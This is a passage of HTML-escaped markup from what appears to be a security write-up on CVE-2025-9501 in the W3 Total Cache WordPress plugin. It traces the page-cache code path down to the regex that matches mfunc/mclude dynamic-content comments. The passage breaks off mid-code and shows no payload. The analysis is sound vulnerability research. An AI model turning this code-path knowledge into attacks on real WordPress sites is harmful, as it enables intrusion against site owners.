class=&#34;s1&#34;&gt;&amp;#39;/plugins&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/w3-total-cache&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/w3-total-cache-api.php&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_ADMIN&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nx&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;strong&amp;gt;W3&amp;ensp;Total&amp;ensp;Cache&amp;ensp;Error:&amp;lt;/strong&amp;gt;&amp;ensp;some&amp;ensp;files&amp;ensp;appear&amp;ensp;to&amp;ensp;be&amp;ensp;missing&amp;ensp;or&amp;ensp;out&amp;ensp;of&amp;ensp;place.&amp;ensp;Please&amp;ensp;re-install&amp;ensp;plugin&amp;ensp;or&amp;ensp;remove&amp;ensp;&amp;lt;strong&amp;gt;%s&amp;lt;/strong&amp;gt;.&amp;ensp;&amp;lt;br&amp;ensp;/&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/w3-total-cache-api.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;class_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\W3TC\Dispatcher&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$w3tc_redirect&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\W3TC\Dispatcher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;component&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Mobile_Redirect&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$w3tc_redirect&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$w3tc_config&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\W3TC\Dispatcher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$w3tc_config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_boolean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pgcache.enabled&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\W3TC\Dispatcher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;component&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PgCache_ContentGrabber&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When page cache (&lt;code&gt;pgcache&lt;/code&gt;) is enabled, &lt;code&gt;$o-&amp;gt;process()&lt;/code&gt; handles page cache logic.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; title=&#34;Enable page cache&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Page Cache&lt;/h2&gt;&lt;p&gt;Enable page cache&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#39; alt=&#34;Page Cache&#34; height=&#34;593&#34; width=&#34;1227&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable page cache&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In &lt;code&gt;process()&lt;/code&gt;, the plugin prepares a mechanism to intercept page content before sending it to the browser:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;run_extensions_dropin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Util_Bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add_ob_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pagecache&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ob_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This registers a callback:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Util_Bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add_ob_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pagecache&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ob_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Meaning:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Plugin registers a callback named &lt;code&gt;pagecache&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The callback is the &lt;code&gt;ob_callback&lt;/code&gt; method of the current object.&lt;/li&gt;&#xA;&lt;li&gt;This is executed &lt;strong&gt;after WordPress generates the full HTML&lt;/strong&gt;, allowing the plugin to process it (optimize, compress, cache) before sending it to the client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;add_ob_callback()&lt;/code&gt; simply stores the callback:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;add_ob_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_w3tc_ob_callbacks&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;ob_callback()&lt;/code&gt; is triggered when the output buffer is flushed, checking for dynamic content:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;ob_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$has_dynamic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_has_dynamic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$has_dynamic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_shutdown_buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;register_shutdown_function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shutdown&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$buffer&lt;/code&gt; contains the full HTML WordPress generated.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;_has_dynamic()&lt;/code&gt; checks for non-cacheable sections:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;_has_dynamic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;lt;!--\s*m(func|clude)\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/m(func|clude)\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\s*--&amp;gt;~Uis&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 